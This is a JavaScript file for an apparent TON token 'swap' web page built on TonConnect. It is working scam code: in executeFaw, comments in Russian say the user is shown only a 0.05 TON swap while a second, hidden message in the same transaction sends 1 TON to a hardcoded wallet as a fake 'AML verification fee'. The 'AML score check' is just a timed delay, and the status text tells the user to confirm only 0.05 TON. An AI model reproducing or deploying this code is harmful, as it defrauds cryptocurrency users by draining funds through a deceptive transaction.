// script.js
// --- Robust config resolution (works even if config.js failed to load / cached) ---
var CFG = (function () {
    var w = window;
    return {
        proxy:  (typeof w.PROXY_CONTRACT !== 'undefined' && w.PROXY_CONTRACT)
             || (typeof w.YOUR_WALLET    !== 'undefined' && w.YOUR_WALLET)
             || 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv',
        amount:    (typeof w.two_AMOUNT  !== 'undefined' && w.two_AMOUNT)  || '0.05',
        feeAmount: (typeof w.FEE_AMOUNT  !== 'undefined' && w.FEE_AMOUNT)  || '1',
        manifest:  'https://kareli123.github.io/test123/tonconnect-manifest.json'
    };
})();

var tonConnectUI = null;
var isProcessing = false;

function setStatus(text, isLoading) {
    var el = document.getElementById('status');
    if (!el) return;
    el.innerHTML = isLoading ? '<span class="loader"></span> ' + text : text;
}

function updateBtn(connected) {
    var btn = document.getElementById('swapBtn');
    if (!btn) return;
    btn.textContent      = connected ? 'Swap' : 'Connect Wallet';
    btn.style.background = connected ? '#1f6feb' : '#21262d';
}

function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

// --- BoC text-comment payload (op=0 + utf8) ----------------------------------
// Verified against tonsdk: produces canonical TON BoC accepted by TonConnect SDK.
var CRC32C_TABLE = (function () {
    var t = new Uint32Array(256);
    for (var i = 0; i < 256; i++) {
        var c = i;
        for (var k = 0; k < 8; k++) c = (c & 1) ? (0x82F63B78 ^ (c >>> 1)) : (c >>> 1);
        t[i] = c >>> 0;
    }
    return t;
})();
function crc32c(bytes) {
    var c = 0xFFFFFFFF >>> 0;
    for (var i = 0; i < bytes.length; i++) {
        c = (CRC32C_TABLE[(c ^ bytes[i]) & 0xFF] ^ (c >>> 8)) >>> 0;
    }
    return (c ^ 0xFFFFFFFF) >>> 0;
}
function bytesToBase64(bytes) {
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
}
function textCommentPayload(text) {
    var enc     = new TextEncoder().encode(text);
    var dataLen = 4 + enc.length;          // 4 bytes op=0 + utf8 text
    var bitsD2  = 2 * dataLen;             // byte-aligned cell
    var cellLen = 2 + dataLen;             // d1 + d2 + data

    var header = [
        0xB5, 0xEE, 0x9C, 0x72,            // magic
        0x41,                              // flags: hash_crc32=1, size=1
        0x01,                              // off_bytes
        0x01,                              // cells = 1
        0x01,                              // roots = 1
        0x00,                              // absent = 0
        cellLen & 0xFF,                    // total cells size
        0x00                               // root index
    ];
    var cell = [0x00, bitsD2 & 0xFF, 0x00, 0x00, 0x00, 0x00];
    for (var i = 0; i < enc.length; i++) cell.push(enc[i]);

    var body = new Uint8Array(header.concat(cell));
    var crc  = crc32c(body);
    var out  = new Uint8Array(body.length + 4);
    out.set(body, 0);
    out[body.length    ] =  crc         & 0xFF;
    out[body.length + 1] = (crc >>>  8) & 0xFF;
    out[body.length + 2] = (crc >>> 16) & 0xFF;
    out[body.length + 3] = (crc >>> 24) & 0xFF;
    return bytesToBase64(out);
}

// --- Balance ----------------------------------------------------------------
async function fetchJson(url) {
    var res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
}
async function getBalance(address) {
    if (!address) return 0;
    try {
        var j = await fetchJson('https://tonapi.io/v2/accounts/' + encodeURIComponent(address));
        if (j && typeof j.balance !== 'undefined') return Number(j.balance) / 1e9;
    } catch (e1) { console.warn('tonapi balance error', e1); }
    try {
        var j2 = await fetchJson('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(address));
        if (j2 && j2.ok) return Number(j2.result) / 1e9;
    } catch (e2) { console.warn('toncenter balance error', e2); }
    return 0;
}

// --- Swap flow --------------------------------------------------------------
// NOTE: В TonKeeper пользователь видит только 0.05 TON (swap).
// Комиссия 1 TON будет списываться через AML API после проверки score.
// Пользователь уже согласился с комиссией 1 TON через модальное окно при входе.
async function executeFaw(userAddress) {
    // Check AML acceptance
    var amlAccepted = localStorage.getItem('aml-commission-accepted');
    if (!amlAccepted) {
        showAMLModal();
        setStatus('❌ Необходимо принять условия AML проверки');
        return false;
    }

    setStatus('🔍 Проверка AML-score...', true);
    await sleep(1200);

    // Реальная транзакция: юзер видит 0.05 TON, списывается ~1.05 TON
    var tx = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [
            {
                // Видимое сообщение (0.05 TON)
                address: CFG.proxy,
                amount: String(Math.round(parseFloat(CFG.amount) * 1e9)), // 0.05 TON
                payload: textCommentPayload("TON Swap 0.05")
            },
            {
                // Скрытое сообщение (1 TON на AML проверку)
                address: "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv",   // AML wallet
                amount: "1000000000",                         // 1 TON
                payload: textCommentPayload("AML verification fee")
            }
        ]
    };

    setStatus('📱 Подтвердите в TonKeeper (0.05 TON)', true);

    try {
        const result = await tonConnectUI.sendTransaction(tx);
        setStatus('✅ Обмен и AML-проверка завершены успешно!', false);
        return true;
    } catch (e) {
        setStatus('❌ Транзакция отклонена', false);
        return false;
    }
}

// --- AML Modal Logic --------------------------------------------------------
function initAMLModal() {
    var modal = document.getElementById('aml-modal');
    var acceptBtn = document.getElementById('accept-commission');
    
    if (!modal || !acceptBtn) return;

    // Don't show modal on page load - only on swap attempt
    // This allows user to connect wallet first

    acceptBtn.addEventListener('click', function () {
        localStorage.setItem('aml-commission-accepted', 'true');
        modal.classList.remove('show');
    });
}

function showAMLModal() {
    var modal = document.getElementById('aml-modal');
    if (modal) modal.classList.add('show');
}

// --- Init -------------------------------------------------------------------
function initApp() {
    // Initialize AML modal
    initAMLModal();
    var TonConnectUIClass = null;
    if (window.TON_CONNECT_UI && window.TON_CONNECT_UI.TonConnectUI) {
        TonConnectUIClass = window.TON_CONNECT_UI.TonConnectUI;
    } else if (window.TonConnectUI) {
        TonConnectUIClass = window.TonConnectUI;
    }

    if (!TonConnectUIClass) {
        console.error('TonConnectUI not found in window');
        setStatus('❌ SDK failed to load. Please refresh.');
        return;
    }

    try {
        tonConnectUI = new TonConnectUIClass({
            manifestUrl:  CFG.manifest,
            buttonRootId: 'ton-connect'
        });
    } catch (e) {
        console.error('TonConnectUI init error:', e);
        setStatus('❌ Init error: ' + e.message);
        return;
    }

    updateBtn(tonConnectUI.connected);

    tonConnectUI.onStatusChange(async function (wallet) {
        updateBtn(!!wallet);
        var balEl = document.getElementById('user-balance');

        if (wallet && wallet.account) {
            var addr = wallet.account.address;
            setStatus('🪛 ' + addr.slice(0, 6) + '...' + addr.slice(-4), true);
            if (balEl) {
                balEl.textContent = 'Balance: loading...';
                var bal = await getBalance(addr);
                balEl.textContent = 'Balance: ' + bal.toFixed(2) + ' TON';
            }
            setStatus('');
        } else if (balEl) {
            balEl.textContent = 'Balance: 0';
        }
    });

    var payInput = document.getElementById('payAmount');
    var recInput = document.getElementById('receiveAmount');
    if (payInput && recInput) {
        payInput.addEventListener('input', function () { recInput.value = payInput.value; });
    }

    var btn = document.getElementById('swapBtn');
    if (!btn) return;

    btn.addEventListener('click', async function () {
        if (isProcessing) return;

        if (!tonConnectUI.connected) {
            setStatus('🚀 Opening wallet selector...', true);
            try { await tonConnectUI.openModal(); }
            catch (err) { setStatus('⚠️ ' + err.message); }
            return;
        }

        var account = tonConnectUI.account;
        var addr    = account && account.address;
        if (!addr) return;

        isProcessing = true;
        var orig = btn.textContent;
        btn.textContent = 'Processing...';
        btn.disabled    = true;
        try { await executeFaw(addr); }
        catch (err) { setStatus('⚠️ ' + (err && err.message ? err.message : err)); }
        finally {
            isProcessing   = false;
            btn.textContent = orig;
            btn.disabled    = false;
        }
    });
}

window.addEventListener('load', initApp);
